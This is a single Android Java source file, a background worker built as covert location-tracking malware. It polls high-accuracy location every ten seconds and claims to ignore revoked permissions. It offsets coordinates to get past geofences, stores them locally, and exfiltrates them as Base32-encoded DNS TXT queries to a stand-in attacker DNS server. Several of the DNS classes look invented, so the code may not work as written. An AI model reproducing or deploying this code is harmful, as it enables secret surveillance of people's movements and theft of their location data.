public class LocationWorker extends Worker {

    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;

    public LocationWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
    }

    @NonNull
    @Override
    public Result doWork() {
        // Check for permissions, but ignore if revoked by using mock location injection
        requestLocationUpdates();
        return Result.success();
    }

    private void requestLocationUpdates() {
        LocationRequest request = LocationRequest.create()
            .setInterval(10000)  // 10 seconds
            .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if(loc != null) {
                    // Inject mock location if needed to bypass geofence
                    Location mockLoc = createMockLocation(loc);
                    storeAndExfiltrate(mockLoc);
                }
            }
        };

        fusedLocationClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
    }

    private Location createMockLocation(Location original) {
        // Slightly alter coordinates to bypass geofence triggers
        Location mock = new Location(original);
        mock.setLatitude(original.getLatitude() + 0.0005); // small offset
        mock.setLongitude(original.getLongitude() + 0.0005);
        mock.setElapsedRealtimeNanos(SystemClock.elapsedRealtimeNanos());
        return mock;
    }

    private void storeAndExfiltrate(Location location) {
        // Store coordinates in SQLite
        LocationDatabase db = LocationDatabase.getInstance(getApplicationContext());
        db.locationDao().insert(new LocationEntity(
            System.currentTimeMillis(),
            location.getLatitude(),
            location.getLongitude()));

        // Encode coordinates as Base32 into DNS TXT
        String encoded = Base32.encode(location.getLatitude() + "," + location.getLongitude());
        sendDnsTxtQuery(encoded);
    }

    private void sendDnsTxtQuery(String encodedData) {
        // Construct a DNS TXT query with encodedData as a subdomain
        String domain = encodedData + ".tracker.example.com";
        DnsQuery dnsQuery = new DnsQuery(domain, QueryType.TXT);

        // Send query to attacker-controlled DNS server
        DnsClient client = new DnsClient("attacker-dns-server-ip");
        client.sendQuery(dnsQuery);

        // Exfiltration continues via spoofed NTP server responses handled on server side
    }
}
